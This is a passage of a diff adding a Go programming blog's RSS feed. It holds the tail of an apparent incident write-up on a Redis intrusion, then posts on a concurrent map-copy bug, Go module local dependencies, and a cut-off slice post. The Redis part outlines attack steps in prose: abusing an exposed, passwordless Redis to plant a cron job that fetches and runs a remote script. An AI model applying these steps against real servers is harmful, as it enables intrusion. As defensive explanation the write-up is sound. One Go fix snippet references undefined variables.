+&lt;/ul&gt;
+&lt;h2 id=&#34;攻击方式总结&#34;&gt;攻击方式总结&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;连接到暴露在公网的redis&lt;/li&gt;
+&lt;li&gt;清空数据库&lt;/li&gt;
+&lt;li&gt;设置cron文件名称&lt;/li&gt;
+&lt;li&gt;设置定时任务
+&lt;ul&gt;
+&lt;li&gt;抓取外网bash脚本并执行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;数据库写文件&lt;/li&gt;
+&lt;li&gt;清空数据库&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;攻击生效的条件&#34;&gt;攻击生效的条件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;以root用户运行redis&lt;/li&gt;
+&lt;li&gt;redis暴露公网且无密码&lt;/li&gt;
+&lt;li&gt;使用了默认的6379&lt;/li&gt;
+&lt;li&gt;允许执行FLUSHALL CONFIG SET SAVE等命令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/111634439&#34;&gt;https://zhuanlan.zhihu.com/p/111634439&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/redis/redis/issues/3594&#34;&gt;https://github.com/redis/redis/issues/3594&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://help.aliyun.com/knowledge_detail/37447.html&#34;&gt;https://help.aliyun.com/knowledge_detail/37447.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    <item>
+      <title>Go中复制map可能遇到坑</title>
+      <link>https://username.github.io/go%E4%B8%AD%E5%A4%8D%E5%88%B6map%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E5%9D%91/</link>
+      <pubDate>Sat, 02 Nov 2019 14:03:25 +0800</pubDate>
+      <guid>https://username.github.io/go%E4%B8%AD%E5%A4%8D%E5%88%B6map%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E5%9D%91/</guid>
+      <description>&lt;p&gt;昨天下午遇到一个问题。服务A与服务B批量建立tcp连接，并定时发送rpc请求（rpc.Ping()）检查连接的健康状态。A服务在kibana出现报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;use of closed network connection
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一反应是B服务重启导致连接断开，正好落在A服务检查出错与重连的时间窗口。运维同学帮拉日志，发现错误：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fatal error: concurrent map iteration and map write\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.771394863Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[11/01/19 10:52:52] [DEBG] RouterRPC Put Request =\u003e \u0026{6076362058 1 200178629686 2fadfb7c24bb440cb9dfcb74f515baef server:1:currt:1572229900380812731:498081}\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stdout&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.771452423Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773643972Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;goroutine 62906840 [running]:\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773666216Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;runtime.throw(0x932fd7, 0x26)\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773672033Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\u0009/app/go1.9/go/src/runtime/panic.go:605 +0x95 fp=0xc4202019a8 sp=0xc420201988 pc=0x42d1a5\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773676889Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;runtime.mapiternext(0xc420201ac8)\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773682159Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\u0009/app/go1.9/go/src/runtime/hashmap.go:778 +0x6f1 fp=0xc420201a40 sp=0xc4202019a8 pc=0x40b7c1\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773686889Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;main.(*RouterRPC).AllRoomCount(0xc4201988c0, 0xc420b08630, 0xc420192158, 0x0, 0x0)\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773694133Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\u0009/path/to/project/rpc.go:185 +0x161 fp=0xc420201b38 sp=0xc420201a40 pc=0x809421\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773704869Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;runtime.call64(0xc420187f20, 0xc420192078, 0xc420358b10, 0x1800000028)\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-11-01T02:52:52.773713993Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\u0009/app/go1.9/go/src/runtime/asm_amd64.s:510 +0x3b fp=0xc420201b88 sp=0xc420201b38 pc=0x45b86b\n&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stream&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stderr&amp;#34;&lt;/span&gt;,
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显示是并发读写map出错，看下这行代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Demo&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foo&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;// /path/to/project/rpc.go:185
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;rep&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Counter&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;rid&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;rc&lt;/code&gt;的类型是&lt;code&gt;map[string]int32&lt;/code&gt;，对它访问没加锁因为预期没有并发写，看下来源：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Demo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int32&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;int32&lt;/span&gt;) {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;bLock&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RLock&lt;/span&gt;()
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; = make(&lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;int32&lt;/span&gt;, len(&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt;))
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;][&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;]
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;bLock&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RUnlock&lt;/span&gt;()
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;b.rc&lt;/code&gt;是一个会被并发读写的&lt;code&gt;map&lt;/code&gt;，所以对它的读操作需加锁。问题出在赋值语句：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;][&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;map&lt;/code&gt;的本质是&lt;code&gt;*hmap&lt;/code&gt;，即&lt;code&gt;hmap&lt;/code&gt;类型的指针，所以变量&lt;code&gt;rc&lt;/code&gt;和&lt;code&gt;b.rc[s][a]&lt;/code&gt;中保存的是同一个指向底层&lt;code&gt;hmap&lt;/code&gt;的地址。&lt;code&gt;Demo()&lt;/code&gt;方法返回后，外面对该地址的读操作并没加锁，从而导致报错。这里代码的本意是复制&lt;code&gt;map&lt;/code&gt;，只是用了错误的方法。正确的做法是循环遍历&lt;code&gt;map&lt;/code&gt;的每个元素逐个赋值到新的&lt;code&gt;map&lt;/code&gt;。例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Demo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int32&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;int32&lt;/span&gt;) {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;bLock&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RLock&lt;/span&gt;()
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;server&lt;/span&gt;][&lt;span style=&#34;color:#a6e22e&#34;&gt;appId&lt;/span&gt;]
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt; = make(&lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;int32&lt;/span&gt;, len(&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt;))
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;m&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt; &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
+			&lt;span style=&#34;color:#a6e22e&#34;&gt;rc&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;rid&lt;/span&gt;] = &lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;
+		}
+	}
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;bLock&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RUnlock&lt;/span&gt;()
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;微服务框架&lt;code&gt;go-micro&lt;/code&gt;中的对头信息的&lt;a href=&#34;https://github.com/micro/go-micro/blob/92b7d2db3bc9612a7f0feafbb7b801d180b5c3b3/metadata/metadata.go#L16&#34;&gt;复制过程&lt;/a&gt;可以作为参考。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Go Module本地依赖的两种玩法</title>
+      <link>https://username.github.io/go-module%E6%9C%AC%E5%9C%B0%E4%BE%9D%E8%B5%96%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8E%A9%E6%B3%95/</link>
+      <pubDate>Sun, 23 Jun 2019 11:34:55 +0800</pubDate>
+      <guid>https://username.github.io/go-module%E6%9C%AC%E5%9C%B0%E4%BE%9D%E8%B5%96%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8E%A9%E6%B3%95/</guid>
+      <description>&lt;h2 id=&#34;两种情况&#34;&gt;两种情况&lt;/h2&gt;
+&lt;p&gt;先看两种依赖关系，如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;同一&lt;code&gt;module&lt;/code&gt;下的不同&lt;code&gt;package&lt;/code&gt;依赖&lt;/li&gt;
+&lt;li&gt;不同&lt;code&gt;module&lt;/code&gt;下的不同&lt;code&gt;package&lt;/code&gt;依赖&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;第一种情况，假设&lt;code&gt;module&lt;/code&gt;名称是&lt;code&gt;go_play&lt;/code&gt;，&lt;code&gt;package&lt;/code&gt;分别是&lt;code&gt;foo&lt;/code&gt;、&lt;code&gt;bar&lt;/code&gt;、&lt;code&gt;biz&lt;/code&gt;则依赖关系简单表示为：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/local_same_module.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第二种情况，假设两个&lt;code&gt;module&lt;/code&gt;分别是&lt;code&gt;go_play&lt;/code&gt;和&lt;code&gt;go_play_another&lt;/code&gt;，新增的&lt;code&gt;package&lt;/code&gt;是&lt;code&gt;baz&lt;/code&gt;，则依赖关系简单表示为：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://username.github.io/images/local_diff_module.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;解决方案&#34;&gt;解决方案&lt;/h2&gt;
+&lt;h3 id=&#34;情况一&#34;&gt;情况一&lt;/h3&gt;
+&lt;p&gt;第一种情况，目录结构如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;go_play
+├── bar
+│   └── bar.go
+├── biz
+│   └── biz.go
+├── foo
+│   └── foo.go
+├── go.mod
+├── play.go
+└── play_test.go
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;初始化&lt;code&gt;module&lt;/code&gt;的方法是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;go mod init go_play
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;按照图中的依赖关系，可以用&lt;code&gt;module_name/package_name&lt;/code&gt;的方式&lt;code&gt;import&lt;/code&gt;同一&lt;code&gt;module&lt;/code&gt;下的其他&lt;code&gt;package&lt;/code&gt;，例如在&lt;code&gt;bar.go&lt;/code&gt;中可以是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;package bar
+
+import (
+	&amp;quot;fmt&amp;quot;
+	_ &amp;quot;go_play/biz&amp;quot;
+)
+
+func init() {
+	fmt.Println(&amp;quot;bar.....&amp;quot;)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，如果&lt;code&gt;biz&lt;/code&gt;中有&lt;code&gt;init&lt;/code&gt;函数则执行之。&lt;/p&gt;
+&lt;h3 id=&#34;情况二&#34;&gt;情况二&lt;/h3&gt;
+&lt;p&gt;第二种情况，新增&lt;code&gt;module&lt;/code&gt;，其目录结构：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;go_play_another
+├── baz
+│   ├── baz.go
+│   └── baz_test.go
+└── go.mod
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以用同样的方法（&lt;code&gt;module_name/package_name&lt;/code&gt;）&lt;code&gt;import&lt;/code&gt;其他&lt;code&gt;module&lt;/code&gt;下的&lt;code&gt;package&lt;/code&gt;，但需要在&lt;code&gt;go.mod&lt;/code&gt;中声明依赖：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;module go_play_another
+
+go 1.12
+
+require go_play v0.0.0
+
+replace go_play =&amp;gt; ../go_play
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里的关键是&lt;code&gt;replace&lt;/code&gt;后的内容，将一个共享的&lt;code&gt;module&lt;/code&gt;替换成本地&lt;code&gt;module&lt;/code&gt;所在的目录。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>slice底层struct的数据结构</title>
+      <link>https://username.github.io/slice%E5%BA%95%E5%B1%82struct%E7%9A%84%E5%9C%B0%E5%9D%80/</link>
+      <pubDate>Thu, 13 Jun 2019 17:51:40 +0800</pubDate>
+      <guid>https://username.github.io/slice%E5%BA%95%E5%B1%82struct%E7%9A%84%E5%9C%B0%E5%9D%80/</guid>
+      <description>&lt;p&gt;我们知道&lt;code&gt;slice&lt;/code&gt;底层的数据结构是&lt;code&gt;SliceHeader&lt;/code&gt;，位于&lt;a href=&#34;https://github.com/golang/go/blob/master/src/reflect/value.go#L1958&#34;&gt;value.go&lt;/a&gt;如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SliceHeader&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
